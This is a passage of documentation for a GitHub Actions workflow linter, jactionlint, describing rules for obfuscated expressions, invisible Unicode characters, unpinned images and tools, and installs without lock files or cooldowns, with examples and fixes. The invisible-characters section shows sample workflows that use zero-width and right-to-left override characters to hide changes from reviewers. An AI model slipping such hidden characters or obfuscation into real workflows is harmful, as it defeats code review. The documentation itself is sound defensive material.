      - uses: actions/checkout@v4
        with:
          repository: ${{ format('{0}/{1}', 'octocat', 'hello-world') }}
      - run: echo '${{ fromJSON(toJSON('[1]'))[0] }}'
      - run: echo '${{ vars[format('NAME_{0}', github.job)] }}'
```

Example config:

```yaml
rules:
  obfuscation: error
```

Output:

```
test.yaml:8:15: path of "actions/checkout/./sub@v4" has redundant or empty segments ("//", "." or ".."). write it as "actions/checkout/sub@v4" [obfuscation]
  |
8 |       - uses: actions/checkout/./sub@v4
  |               ^~~~~~~~~~~~~~~~~~~~~~~~~
test.yaml:11:27: format() is called with literal arguments only so its result is the constant "octocat/hello-world". write the string itself [obfuscation]
   |
11 |           repository: ${{ format('{0}/{1}', 'octocat', 'hello-world') }}
   |                           ^~~~~~~~~~~~~~~~~
test.yaml:12:24: fromJSON(toJSON(...)) returns its argument unchanged. remove both calls [obfuscation]
   |
12 |       - run: echo '${{ fromJSON(toJSON('[1]'))[0] }}'
   |                        ^~~~~~~~~~~~~~~~~~~~~~~~~~
test.yaml:13:29: the index is computed, which hides which property is read from tools that look for it. use a literal property name or a matrix to select the value [obfuscation]
   |
13 |       - run: echo '${{ vars[format('NAME_{0}', github.job)] }}'
   |                             ^~~~~~~~~~~~~~~~~~
```

<!-- Skip playground link -->

**Fix.** `--fix=unsafe` rewrites the paths of `uses:`. It is unsafe because the plain path is expected, but not guaranteed, to name the same action. The messages of the other findings say how to write the value instead.

<a id="check-invisible-characters"></a>
## Invisible characters

The rule `invisible-characters` reports characters that are displayed as nothing, or that change how the text around them is displayed, in a workflow, a Dependabot configuration or an `action.yml` file. It is in the `default` profile, at the level `error`.

Example input:

```yaml
on: push
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout​@v4
      - run: echo "tests passed" # ‮success
```

Output:

```
test.yaml:6:31: invisible character U+200B ZERO WIDTH SPACE in a uses: reference: it is not shown by editors or by the diff view of GitHub, so it can hide what the text really is. remove it [invisible-characters]
  |
6 |       - uses: actions/checkout​@v4
  |                               ^
test.yaml:7:36: invisible character U+202E RIGHT-TO-LEFT OVERRIDE in a comment: it changes the order in which the text around it is displayed, so the code can run differently from how it reads. remove it [invisible-characters]
  |
7 |       - run: echo "tests passed" # ‮success
  |                                    ^
```

[Playground](https://jactionlint.jdx.dev/#eNo8zDsOwjAQhOE+pxiF2qKhcsVVnGUl85DXyuxSp+cuHConQQaJaorv11jL6ME63WxhngBX+lhgjcY0PJZoHulRhn2Jrp2/CkgIKjOK+NUaj1JV7ha+b6/z8/SP1mgZKtUwjx+iF1IvMw7YtzdDRMnPAKsALro=)

The example has a zero width space in the `uses:` reference and a right-to-left override in the comment. Neither is visible in an editor, and GitHub does not show them in the diff view of a pull request either, so a change that adds one looks harmless. They can make a value differ from what a reviewer reads (an action, a branch, a condition) or reorder the text so that code reads differently from how it runs ([Trojan Source](https://trojansource.codes/)).

**What is reported.** These characters, wherever they are in the file (code, a key, a string or a comment, and also in a file that does not parse):

- bidirectional controls: embeddings, overrides and isolates (`U+202A` to `U+202E`, `U+2066` to `U+2069`), and the marks `U+061C`, `U+200E` and `U+200F` unless they are next to right-to-left text;
- zero width characters: `U+200B`, `U+2060`, `U+180E`, the invisible operators `U+2061` to `U+2064`, the soft hyphen `U+00AD`, the deprecated format characters `U+206A` to `U+206F`, `U+FEFF` anywhere except at the start of the file, and the joiners `U+200C` and `U+200D` where they are not part of correct spelling;
- tag characters (`U+E0000` block), which can smuggle text, and variation selectors that do not follow a character they can modify;
- fillers that are drawn as blanks (`U+115F`, `U+1160`, `U+3164`, `U+FFA0`), line and paragraph separators (`U+2028`, `U+2029`) and control characters other than tab, line feed and carriage return (such as the escape character).

One finding is reported for a run of adjacent characters. The message says where the character is (a `run:` script, an expression, a `uses:` reference, a comment, a value or a key). Every finding has the level of the rule (`error` by default), also in a comment: a comment is how the change is made to look harmless.

**What is not reported.** Letters, combining marks and symbols of any language are never reported, so non-English text is fine. These legitimate uses are not reported either: the byte order mark at the start of a file, emoji sequences (a zero width joiner or a variation selector between emoji, keycaps, flags made from tag characters), the zero width (non-)joiner in scripts that are spelled with it (Persian, Devanagari and other Indic scripts, and others), the variation selectors of CJK ideographs and Mongolian, and direction marks next to Arabic or Hebrew letters.

**Files in UTF-16 or UTF-32.** A file saved as UTF-16 or UTF-32 (it starts with the byte order mark of one of them) has a NUL byte next to every character. It gets one finding at its first line, without a fix, that names the encoding, instead of one for every NUL. Save the file as UTF-8 without a byte order mark.

**Fix.** `--fix` removes the characters of the finding. This is a safe fix: what is left is what the reader of the file already saw. If the character is meant to be in a string, write it as an escape in a double quoted YAML string (`"​"`) or in the shell (`$'​'`), where it is visible in the source. To silence a finding, put `# jactionlint ignore=invisible-characters` on the line before it (see [ignore a finding](ignore.md#ignore-some-errors)), or turn the rule off with `rules: invisible-characters: off`.

**Related.** How this rule compares with zizmor is on the [zizmor parity page](zizmor-parity.md).

<a id="check-unpinned-images"></a>
## Unpinned container images

The rule `unpinned-images` (in the `default` profile) reports a container image that is not pinned by a digest: the `container:` of a job, the `image:` of a service, and the image that `docker run`, `docker create` or `docker pull` names in a script. A tag can be moved to another image by whoever controls the registry repository, and an image without a tag is `latest`, so what runs in your job can change without any change to the workflow.

Example input:

```yaml
on: push

jobs:
  test:
    runs-on: ubuntu-latest
    # ERROR: no tag, so this is "latest"
    container: node
    services:
      db:
        # ERROR: a tag can be moved to another image
        image: postgres:16
      cache:
        # OK: pinned by a digest
        image: redis:7@sha256:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
    steps:
      - run: echo hello
```

Example config:

```yaml
rules:
  unpinned-images: error
```

Output:

```
test.yaml:7:16: container image "node" has no tag, so the registry decides which image is pulled ("latest"). pin it to a digest like "node@sha256:{digest}" [unpinned-images]
  |
7 |     container: node
  |                ^~~~
test.yaml:11:16: image "postgres:16" of service "db" is pinned by a tag, which can be moved to another image. pin it to a digest like "postgres:16@sha256:{digest}" [unpinned-images]
   |
11 |         image: postgres:16
   |                ^~~~~~~~~~~
```

<!-- Skip playground link -->

The output keeps only the findings of this rule: `jactionlint --select unpinned-images test.yaml` prints the same for a copy of the example. In [the config file](./config.md#rule-levels-and-options) the rule is set like this, at its default level; the example config of this section is such an entry.

**Fix.** Pin the image with its content digest: `postgres:16@sha256:{64 hex digits}`. Keep the tag next to the digest, so that Dependabot and Renovate can update both. `docker inspect postgres:16 --format='{{index .RepoDigests 0}}'` prints the digest of an image you have pulled. With `--online --fix=unsafe` jactionlint writes the digest for you, see [how the online fix finds a digest](#how-the-online-fix-of-unpinned-images-finds-a-digest).

**Configure.** An image without a tag and an image with the tag `latest` are reported with a stronger message. To report only those two and accept tags, turn off the option `require-digest`:

```yaml
rules:
  unpinned-images:
    level: warn
    require-digest: false
```

**Images written with an expression** are checked as far as they can be known:

- an image from the matrix (`image: ${{ matrix.image }}`, `${{ matrix.config.image }}`) is checked at the values the matrix writes, and an image made of text and matrix values (`postgres:${{ matrix.postgres }}`) for each combination of the values. A matrix that is computed (`fromJSON()`) or has a value that is an expression is not known;
- an image whose text after the last expression is written out and has no digest (`${{ needs.build.outputs.image }}-bookworm`, `${{ vars.REGISTRY }}/tool:1.2`) is reported: a digest is the end of an image, so no value of the expression can make it pinned;
- any other image from an expression (`image: ${{ vars.IMAGE }}`, `ghcr.io/org/tool:${{ inputs.tag }}`) may or may not end in a digest, which is only known when the workflow runs. It is reported with the option `pedantic` (on under `profile: pedantic`, or `rules: {unpinned-images: {level: warn, pedantic: true}}`).

An image of `uses: docker://alpine:3.20` is checked by the [`unpinned-uses`](#check-action-format) rule, not by this one.

**Images in scripts.** The image of `docker run`, `docker create` and `docker pull` is checked too, with the same messages. The forms `docker container run` and `docker image pull` count, and so do the same commands of `podman` and `nerdctl`:

```yaml
steps:
  # ERROR: the image of the script is not pinned either
  - run: docker run --rm -v "$PWD:/w" -w /w node:20 npm test
```

The command line is read as far as its options are known. These images are not reported:

- an image of a command with an option that jactionlint does not know, because the option could take the image as its value;
- an image that is a variable, an expression or a command substitution, an image id, and `scratch`;
- an image that the workflow builds itself: the name of a `docker build -t` or `--tag`, the target of a `docker tag` or `docker commit`, a `tags:` of `docker/build-push-action`, and a name which another command of the repository gets as an argument (`./build.sh app:ci`, `docker push app:ci`);
- every image of a workflow that loads archives (`docker load`) or uses `docker compose`, `docker/bake-action`, buildah or kaniko;
- the `FROM` lines of a Dockerfile, which are not read. `docker build --pull` names no image and is not checked.

**Policies.** The option `policies` sets how strongly the images that match a pattern are pinned, so that the images of your own registry can be pinned by a tag while the rest needs a digest:

```yaml
rules:
  unpinned-images:
    require-digest: true
    policies:
      "ghcr.io/my-org/*": tag-pin    # a tag other than latest, or a digest
      "registry.example.com/*": any  # nothing is required
      "node:20": any                 # a pattern with a tag matches that tag only
      "*": hash-pin                  # a digest (the default of require-digest)
```

The policies are `hash-pin` (a digest), `tag-pin` (a tag other than `latest`, or a digest) and `any` (nothing is required). A pattern is a glob of the image name where `*` matches any characters, `/` included. `node` and `docker.io/library/node` are the same image. A policy wins over `require-digest`. To forbid or allow images by name, see the options `images-allow` and `images-deny` of [`forbidden-uses`](#check-forbidden-uses).

#### How unpinned-images chooses a policy

When several patterns match an image, the most specific one decides. The patterns are compared in this order, with the registry written out (`node` is `docker.io/library/node`, and `docker.io/*` is `docker.io/library/*`):

1. more literal characters before the first `*` of the pattern;
2. fewer `*`;
3. a pattern with a tag beats the same name without one;
4. the longer pattern as written;
5. for patterns that tie on all of these, the first one in lexical order.

So `node` beats `docker.io/library/*`, `docker.io/library/*` beats `docker.io/*`, `node:20` beats `node`, and `ghcr.io/org/app` beats `ghcr.io/org/*`, which beats `ghcr.io/*` and `*`.

#### How the online fix of unpinned-images finds a digest

With `--online --fix=unsafe` jactionlint writes the digest for you: `postgres:16` becomes `postgres:16@sha256:...` (the format Renovate keeps up to date), and an image without a tag becomes `image:latest@sha256:...`, because that is what Docker pulls. The fix covers `container:`, `services:`, the values a matrix writes, `uses: docker://` and the `runs.image: docker://` of an action. [Pin container images to digests](./online.md#pin-container-images-to-digests-with-online-fix-unsafe) shows it on a workflow.

The fix is **unsafe** (`--fix=unsafe`): the image behind a tag moves, and the digest is the image of this moment, so look at what you are pinning. It never updates a pin to a newer image.

The digest is asked of the registry (the v2 API, a HEAD request of the manifest) and is the one `docker pull image:tag` resolves today: for a multi-platform image, the digest of its index. Only Docker Hub (`docker.io`, `ubuntu`, `owner/image`) and ghcr.io are asked, and an image of another registry gets the reason in the finding instead of a request. Both give an anonymous token for a public image. For a private image on ghcr.io, jactionlint sends the token of GitHub (`GITHUB_TOKEN`) to ghcr.io as its password when the anonymous request is refused, and to no other host.

`--online-allow` and `--online-deny` apply to images as `owner/image` (`library/ubuntu` for an official image of Docker Hub), whichever registry the image is on. `--online=cache` does not look images up, because a digest is not kept in the cache: a tag moves. The finding then says that the fix needs `--online`, and the missing lookup does not count as skipped for `strict`. A tag that does not exist, a private image and a registry that fails leave the finding without a fix, with the reason.

What the answers of the registries mean (the same for Docker Hub and ghcr.io):

| Request | Answer | Meaning |
| --- | --- | --- |
| token service | 401, 403, 404, 429, 5xx, no answer | the registry fails: the finding says so, and after three failures in a row (at once for a rate limit) the registry is not asked again in this run |
| manifest | 401, 403, 404 | the registry answered: the image is private or does not exist for this token. No failure, no backoff. ghcr.io is asked once more with the GitHub token first |
| manifest | 429, 5xx, no answer | the registry fails, as for the token service |

**Related.** zizmor has an audit of the same name; [zizmor parity](./zizmor-parity.md) compares the two.

<a id="check-unpinned-tools"></a>
## Tools installed without an exact version

The rule `unpinned-tools` (in the `default` profile) reports a step that uses an action which installs the newest release of its tool, because the input that selects the version is not set or is `latest`. Pinning an action to a commit does not pin the tool that the action downloads.

Example input:

```yaml
on: push
jobs:
  scan:
    runs-on: ubuntu-latest
    steps:
      - uses: aquasecurity/setup-trivy@e6c2c5e321ed9123bda567646e2f96565e34abe1 # v0.2.4
```

Output:

```
test.yaml:6:15: action "aquasecurity/setup-trivy@e6c2c5e321ed9123bda567646e2f96565e34abe1" installs the newest version of its tool because the input "version" is not set. set "version" to an exact version [unpinned-tools]
  |
6 |       - uses: aquasecurity/setup-trivy@e6c2c5e321ed9123bda567646e2f96565e34abe1 # v0.2.4
  |               ^~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
```

[Playground](https://jactionlint.jdx.dev/#eNokyjGugzAMgOGdU1h6c3glEFdk6lWc4KpUVUhjG4nbV7TTP3z/ViJUk0f33JLEDkAylbMAzYq40y1ZUXMvUhb9kihX+V0ADkxYItDbSDhbW/X4F1arTtu6HzfG7HPg0Q+8zIMf00IBrzgh+/uMAQOPEyUe4A/2S+/76TMAq3QtNQ==)

**What is reported.** A step that uses `aquasecurity/setup-trivy`, `1password/load-secrets-action`, `extractions/setup-just` or `extractions/setup-crate` and does not set the input that selects the version, or sets it to `latest` (`*` for the last two). A value that is an expression is not judged.

**Fix.** Set the input to an exact version. There is no automatic fix, because the version to use is the decision of the author.

**With the option `pedantic`** (on under `profile: pedantic`, or `rules: {unpinned-tools: {level: warn, pedantic: true}}`) the rule reports more:

- further actions that install the newest version of their tool by default: `hashicorp/setup-terraform`, `azure/setup-kubectl` and `azure/setup-helm`;
- `run:` scripts that install or run a tool without an exact version: `pip install`, `pipx install` and `pipx run`, `uv tool install`, `uv pip install` and `uvx`, `cargo install` and `cargo binstall`, `go install`, `npm install -g`, `npx --yes`, `pnpm dlx`, `yarn dlx` and `aube dlx` (`aubx`). One finding names all the tools of a command. Pin them with `==`, `--version`, `@v1.2.3` or `@1.2.3` according to the tool.

These are not reported: packages from a path, requirements files (`pip install -r`) and `npx tsc` (also `npm exec tsc`, `npm x tsc` and `bun x tsc`), which runs the program of the project. `aube exec` only runs an installed binary and never downloads, and `aubx tsc` or `aube dlx tsc` with a bare name runs the binary of the project when there is one, so they are not reported either, unlike `aubx tsc@latest` or `aubx -p typescript tsc`, which install a package.

The following example runs with the option and the level `warn`:

Example input:

```yaml
# select: unpinned-tools
on: push
jobs:
  tools:
    runs-on: ubuntu-latest
    steps:
      - uses: hashicorp/setup-terraform@b9cd54a3c349d3f38e8881555d616ced269862dd # v3.1.2
      - run: pip install requests black==24.3.0
      - run: go install golang.org/x/tools/cmd/stringer@latest
```

Example config:

```yaml
rules:
  unpinned-tools:
    level: warn
    pedantic: true
```

Output:

```
test.yaml:7:15: warning: action "hashicorp/setup-terraform@b9cd54a3c349d3f38e8881555d616ced269862dd" installs the newest version of its tool because the input "terraform_version" is not set. set "terraform_version" to an exact version [unpinned-tools]
  |
7 |       - uses: hashicorp/setup-terraform@b9cd54a3c349d3f38e8881555d616ced269862dd # v3.1.2
  |               ^~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
test.yaml:8:14: warning: tool "requests" is installed without an exact version, so every run may fetch a different release. pin it with `==`, for example `tool==1.2.3` [unpinned-tools]
  |
8 |       - run: pip install requests black==24.3.0
  |              ^~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
test.yaml:9:14: warning: tool "golang.org/x/tools/cmd/stringer@latest" is installed without an exact version, so every run may fetch a different release. pin it with a version, for example `tool@v1.2.3` [unpinned-tools]
  |
9 |       - run: go install golang.org/x/tools/cmd/stringer@latest
  |              ^~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
```

<!-- Skip playground link -->

**Related.** The packages of a project are the business of the lock file, see [unlocked installs](#check-unlocked-install), and packages installed by name are in [adhoc packages](#check-adhoc-packages). zizmor covers the actions that the rule reports without the option; [zizmor parity](./zizmor-parity.md) compares the two.

<a id="check-adhoc-packages"></a>
## Packages installed by name

The rule `adhoc-packages` (in the `default` profile) reports a `run:` script that installs a package by name outside of a lock file, with `npm`, `yarn`, `pnpm`, `bun`, [`aube`](https://aube.sh) (`aube add`), `gem`, `bundle add` or `lerna add`. Such a package is usually not pinned, so the newest release, and with it a compromised one, is picked up. Even with `eslint@9.0.0` the dependencies of the package are resolved anew on every run. Commands such as `yarn add`, `bundle add` and `lerna add` change the lock file of the run instead of using it, so they are reported too.

Example input:

```yaml
on: push
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - run: npm install eslint@9.0.0
      - run: gem install rake
```

Output:

```
test.yaml:6:14: command "npm install" installs a package outside of a lock file: its dependencies are resolved anew on every run, although its version is pinned. add the package to package.json and commit the package-lock.json and install with `npm ci` [adhoc-packages]
  |
6 |       - run: npm install eslint@9.0.0
  |              ^~~~~~~~~~~~~~~~~~~~~~~~
test.yaml:7:14: command "gem install" installs a package outside of a lock file: its version and its dependencies are resolved anew on every run. add the package to a Gemfile and commit the Gemfile.lock and install with `bundle install` [adhoc-packages]
  |
7 |       - run: gem install rake
  |              ^~~~~~~~~~~~~~~~
```

[Playground](https://jactionlint.jdx.dev/#eNpUyjEOAjEMRNF+TzEXyGpbUnGVrGRBwDhRxr4/MhSI6hf/DauYwfv2GCfrBrjQs8AKY8kfZ5hH0Zbvs+gy+VVASVlh84Vu9KYKoXbz62U/9uNf3eSnVnvKewDexCcZ)

**Fix.** Add the package to a manifest that produces a lock file (`package.json`, a `Gemfile`), commit the lock file and install with a command that follows it: `npm ci`, `yarn install --immutable`, `pnpm install --frozen-lockfile`, `bun ci`, `aube ci` or `bundle install`. There is no automatic fix.

**What is not reported.**

- an install from a manifest (`npm install`, `npm ci`), from the checkout (`npm install .`) and from a gem file (`gem install ./pkg.gem`);
- a list of arguments that the script builds (`pnpm install --frozen-lockfile "${filters[@]}"`), which is not taken for package names;
- a line of a script of `shell: pwsh`, `powershell` or `cmd` (also the default shell of a Windows runner) that is not a plain command like `npm install typescript`. The script is not parsed, so a line with the syntax of the shell (a variable, a pipe, a `;`, a block) is left alone, and so is a command that goes on over several lines.

**Related.** A tool that the workflow itself needs, installed with `pip install` or `cargo install`, is covered by [unpinned tools](#check-unpinned-tools), and the lock file by [unlocked installs](#check-unlocked-install). zizmor has an audit of the same name; [zizmor parity](./zizmor-parity.md) lists the differences.

<a id="check-unlocked-install"></a>
## Installs without a lock file

The rule `unlocked-install` (in the `default` profile) reports an install that does not use a lock file: `cargo install` without `--locked`, and an `npm`, `yarn`, `pnpm` or `aube` install from a manifest that ignores the lock file of the repository. Without a lock file the dependencies are resolved anew on every run, so a new release of any transitive dependency, a compromised one included, reaches the workflow.

Example input:

```yaml
on: push
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - run: cargo install cargo-nextest
```

Output:

```
test.yaml:6:14: "cargo install" without --locked builds with the newest dependencies that match the crate instead of the ones in its Cargo.lock, so a new release of any dependency reaches the workflow. add --locked [unlocked-install]
  |
6 |       - run: cargo install cargo-nextest
  |              ^~~~~~~~~~~~~~~~~~~~~~~~~~~
```

[Playground](https://jactionlint.jdx.dev/#eNoky90JwCAMxPF3p7gFsoDbaJF+IFG8BDp+SX0K4fe/oRnTeaVnVOYEWKPFBZYrJdyrq7n0EvYTrU3uCpAoM46yzoFbaaX3/Ym2NzbfAESiIIE=)

**What is reported.** `cargo install` without `--locked` (or `--frozen`): the crate was published with a `Cargo.lock`, and `--locked` builds with it.

Installs from a manifest that ignore the lock file of the repository are reported when the lock file exists, because only then it is being ignored. The lock file is looked up in the root of the repository and in the `working-directory` of the step: `package-lock.json` (or `npm-shrinkwrap.json`) for npm, `yarn.lock` for Yarn, `pnpm-lock.yaml` for pnpm, and for aube any of `aube-lock.yaml`, `pnpm-lock.yaml`, `bun.lock`, `yarn.lock`, `npm-shrinkwrap.json` or `package-lock.json` (aube reads and writes the lock file the project has). The reported installs are:

- `npm install` without a package: use `npm ci`, which fails when `package-lock.json` is out of date;
- `yarn` and `yarn install` without `--immutable` (`--frozen-lockfile` in Yarn 1), and `pnpm install --no-frozen-lockfile`. pnpm freezes the lock file in CI by default, so plain `pnpm install` is not reported. Yarn 2 and later does so too, so for Yarn the flag makes it explicit;
- `aube install` with `--no-frozen-lockfile`, `--prefer-frozen-lockfile` or `--fix-lockfile`. Like pnpm, aube freezes the lock file by default when the environment variable `CI` is set, which GitHub does on its runners, so plain `aube install` is not reported, and `aube ci` always freezes. A `preferFrozenLockfile: false` in `aube-workspace.yaml` or `.npmrc`, or `AUBE_PREFER_FROZEN_LOCKFILE=false`, also turns the default off and is not read.

**Fix.** For `cargo install`, `jactionlint --fix=unsafe` inserts `--locked`. The fix is **unsafe** because the build can fail where it succeeded, for example when the lock file of the crate is out of date. It is only offered when the position of `install` in the file is known for sure. The other findings of the rule have no automatic fix.

**With the option `pedantic`** (on under the `pedantic` profile) the rule also reports:

- manifest installs in a repository that has no lock file (a lock file may be created in the job, or not exist yet), `bun install` without `--frozen-lockfile` (or use `bun ci`), and `pip install -r` (also `uv pip install -r`) without `--require-hashes` or a constraints file `-c`;
- installs that run the lifecycle scripts of the dependencies, see [lifecycle scripts run by an install](#lifecycle-scripts-run-by-an-install);
- installs without a release-age cooldown, see [release-age cooldown of an install](#release-age-cooldown-of-an-install).

The following example shows a manifest install and a requirements file with the option on:

Example input:

```yaml
# select: unlocked-install
on: push
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - run: npm install
      - run: pip install -r requirements.txt
```

Example config:

```yaml
rules:
  unlocked-install:
    pedantic: true
```

Output:

```
test.yaml:7:14: "npm install" resolves the dependencies again and may update the package-lock.json instead of failing when it is out of date. use `npm ci` [unlocked-install]
  |
7 |       - run: npm install
  |              ^~~~~~~~~~~
test.yaml:7:14: "npm install" runs the lifecycle scripts (preinstall, install, postinstall) of every dependency, and a compromised release uses them to run code on the runner. pass `--ignore-scripts` or set `ignore-scripts=true` in .npmrc, and run what a package needs with `npm rebuild` [unlocked-install]
  |
7 |       - run: npm install
  |              ^~~~~~~~~~~
test.yaml:7:14: "npm install" takes the newest release of every dependency, however new, so a compromised release reaches the workflow before it is found and pulled. pass `--min-release-age=7` or set `min-release-age=7` in .npmrc (npm 11.10 and later) [unlocked-install]
  |
7 |       - run: npm install
  |              ^~~~~~~~~~~
test.yaml:8:14: "pip install -r requirements.txt" installs a requirements file without hashes or constraints, so the transitive dependencies are resolved anew on every run. use a lock file with hashes (`pip-compile --generate-hashes`) and pass --require-hashes, or pin them with -c [unlocked-install]
  |
8 |       - run: pip install -r requirements.txt
  |              ^~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
test.yaml:8:14: "pip install" takes the newest release of every dependency, however new, so a compromised release reaches the workflow before it is found and pulled. pass `--uploaded-prior-to` (pip 26.0 and later; a date, or a duration such as `P7D`), or install with uv and `--exclude-newer` [unlocked-install]
  |
8 |       - run: pip install -r requirements.txt
  |              ^~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
```

<!-- Skip playground link -->

This is the output for a file in a repository that has no `package-lock.json`. With a `package-lock.json`, the first finding is reported without the option. Replacing `npm install` with `npm ci` silences the first and the third finding, and `--ignore-scripts` (or `ignore-scripts=true` in `.npmrc`) silences the second. The third finding needs the repository: a file read from standard input, or a file outside a repository, does not get it.

#### Lifecycle scripts run by an install

`npm ci`, `npm install`, `yarn install`, `yarn add` and `bun install` without `--ignore-scripts` run the `preinstall`, `install` and `postinstall` scripts of every package of the dependency tree. A compromised release is installed, and its script runs on the runner with its tokens. Most workflows do not need the scripts of all their dependencies, and the few that do (`esbuild`, `sharp`, `node-gyp` builds) can run them with `npm rebuild <package>` after the install. The finding is not reported when the choice has been made:

- the command has `--ignore-scripts` (Yarn 2 and later: `--mode=skip-build`), or only writes the lock file (`npm install --package-lock-only`);
- the repository has `ignore-scripts=true` in its `.npmrc` (npm, Yarn 1 and bun read it), `ignoreScripts = true` in `bunfig.toml` or `enableScripts: false` in `.yarnrc.yml`. The files are looked up in the root of the repository and in the `working-directory` of the step;
- the environment of the step sets `npm_config_ignore_scripts` (`YARN_ENABLE_SCRIPTS=false` for Yarn), or an earlier step of the job runs `npm config set ignore-scripts true` or writes `ignore-scripts=true` to a `.npmrc` (`>> ~/.npmrc`, `tee -a .npmrc`) before the install. Text that only prints the setting (`echo "ignore-scripts=true"`) does not count, and neither does a setting after the install;
- the package.json has an allow list: `trustedDependencies` for bun (bun runs the scripts of a default list of popular packages, and an explicit list replaces it) and `allowScripts` for npm 12, which does not run the scripts of dependencies by default;
- Yarn is 4.14 or later (`packageManager` in package.json), which does not run them by default either. Yarn 2 to 4.13 do, so a `.yarnrc.yml` of a Yarn whose version is not known is not assumed to be one that does not.

pnpm is not reported: pnpm 10 and later run no script of a dependency unless the project allows it.

[aube](https://aube.sh) is not reported either: it runs the scripts of a dependency only when `allowBuilds` allows the package or the package is on the built-in list of trusted packages that aube takes from pnpm, and `--ignore-scripts` turns all of them off ([lifecycle scripts of aube](https://aube.sh/package-manager/lifecycle-scripts)). It is reported when the project opted out of that:

- `aube install` and `aube add` with `--dangerously-allow-all-builds`;
- the setting `dangerouslyAllowAllBuilds` (also `dangerously-allow-all-builds`) in `.npmrc`, in the environment (`AUBE_DANGEROUSLY_ALLOW_ALL_BUILDS`, `npm_config_dangerously_allow_all_builds`) or set by an earlier `aube config set`;
- the entry `"*": true` in `allowBuilds` of `aube-workspace.yaml` (or of `pnpm-workspace.yaml`, which aube reads only when there is no `aube-workspace.yaml`), or in `aube.allowBuilds` and `pnpm.allowBuilds` of package.json.

`aube ci` is never reported, because it turns the setting off itself. The command line decides over the other places, and `--ignore-scripts`, `ignore-scripts` or `ignoreScripts` in `.npmrc`, `ignoreScripts: true` in the workspace file and `AUBE_IGNORE_SCRIPTS` in the environment silence the finding. A value that is an expression is not known and is not reported.

Global installs (`npm install -g`) and `npx` are not reported, and neither is a command which follows a `cd`, because the configuration in force is not known. Whether the project's own scripts (`prepare`, `postinstall`) are needed is not known either: they run unless `--ignore-scripts` is given.

#### Release-age cooldown of an install

An install that resolves versions takes the newest release of every dependency, however new, and most compromised releases are found and pulled within days. A cooldown keeps only versions that are some days old. This is the counterpart of [`dependabot-cooldown`](#check-dependabot-cooldown) for the installs of a `run:` script. The setting of each tool:

| Tool | Setting | From |
| ---- | ------- | ---- |
| uv (`uv pip install`, `uv add`, `uv tool install`, `uvx`) | `--exclude-newer` (a date or a duration), `UV_EXCLUDE_NEWER`, `exclude-newer` in `uv.toml` or `[tool.uv]` of `pyproject.toml` | all |
| pip, pipx | `--uploaded-prior-to` (a date, or a duration in days such as `P7D`), `PIP_UPLOADED_PRIOR_TO`; only for indexes that tell the upload time | pip 26.0 |
| npm | `--min-release-age=DAYS` or `min-release-age` in `.npmrc`; `--before=DATE` | npm 11.10 |
| pnpm | `minimumReleaseAge` (minutes) in `pnpm-workspace.yaml` (pnpm 10.16 to 10.x also read `minimum-release-age` from `.npmrc`; pnpm 11 does not, and a `.npmrc` entry does not change its default; the `min-release-age` and `before` of npm are not read); pnpm 11 waits one day by default | pnpm 10.16 |
| Yarn | `npmMinimalAgeGate` in `.yarnrc.yml`; Yarn 4.15 waits one day by default; Yarn 1 has none | Yarn 4.10 |
| bun | `--minimum-release-age` (seconds) or `minimumReleaseAge` under `[install]` in `bunfig.toml`; bun reads nothing of the kind from `.npmrc` | bun 1.3 |
| aube | `minimumReleaseAge` (minutes) in `aube-workspace.yaml` (or `pnpm-workspace.yaml` when there is no aube file), `minimumReleaseAge` or `minimum-release-age` in `.npmrc` (the workspace file wins), `AUBE_MINIMUM_RELEASE_AGE` or `npm_config_minimum_release_age`; aube has no option for it and waits one day (1440) by default, so only a setting that turns it off is reported | all |

Check the version of the tool on the runner before you add the setting: an option that the installed pip or npm does not know fails the install.

The rule reports installs that resolve something. To decide whether a cooldown is on, it reads these places in order, and the **last** assignment wins:

1. the default of the version of the tool (pnpm 11, Yarn 4.15 and aube wait one day);
2. the files of the repository: `uv.toml`, `pyproject.toml`, `.npmrc`, `pnpm-workspace.yaml`, `.yarnrc.yml` and `bunfig.toml`;
3. the environment of the workflow, then of the job, then of the step;
4. the scripts of the job that run before the install;
5. the options of the install itself.

The last assignment wins inside a place too, so `--min-release-age=7 --min-release-age=0` is off. Only npm differs: inside one place `before` wins over `min-release-age`. A value switches the age off when it is empty, `false`, `none`, `off` or a zero with or without a unit (`0`, `0d`, `0 days`, `P0D`, `PT0S`); a variable or an expression counts as on. The environment variable, the option and the file are those of the tool that installs (`UV_EXCLUDE_NEWER` does nothing for npm), and `minimumReleaseAgeExclude` and `minimumReleaseAgeStrict` are not the age.

An install of an exact version (`pip install requests==2.32.3`) is reported too: the dependencies of the package are still resolved anew. The rule is silent about these:

- installs that are bound to a lock file or to hashes (`npm ci`, `aube ci`, `uv sync`, `--frozen-lockfile`, `--immutable`, `--require-hashes`, a constraints file `-c`), and `npm install`, `pnpm install`, `aube install` and `yarn` without a package in a repository that has the lock file (aube freezes it in CI by default; `--no-frozen-lockfile`, `--prefer-frozen-lockfile` and `--fix-lockfile` resolve again);
- `npx`, `bunx` and `pnpm dlx`, which usually run a binary of the project, and ecosystems whose tool has no such setting (cargo, go, gem, apt, Homebrew);
- a command that follows a `cd`, or has `--project`, `--directory` or `--config-file` for uv, because the configuration in force is not known (`--no-config` is the opposite: uv reads no file, so only an option or `UV_EXCLUDE_NEWER` counts);
- Yarn 2 and later of an unknown version, because the default depends on it.

**Related.** Installing named packages is covered by [adhoc packages](#check-adhoc-packages) and [unpinned tools](#check-unpinned-tools). zizmor has no audit for this rule; see [zizmor parity](./zizmor-parity.md).

<a id="check-unverified-download"></a>
## Unverified downloads

The rule `unverified-download` (in the `default` profile) reports a `run:` script that runs what it has downloaded without checking it first. Whoever controls the server, or the connection to it, then controls the job, with its secrets and its token.

Example input:

```yaml
on: push
jobs:
  setup:
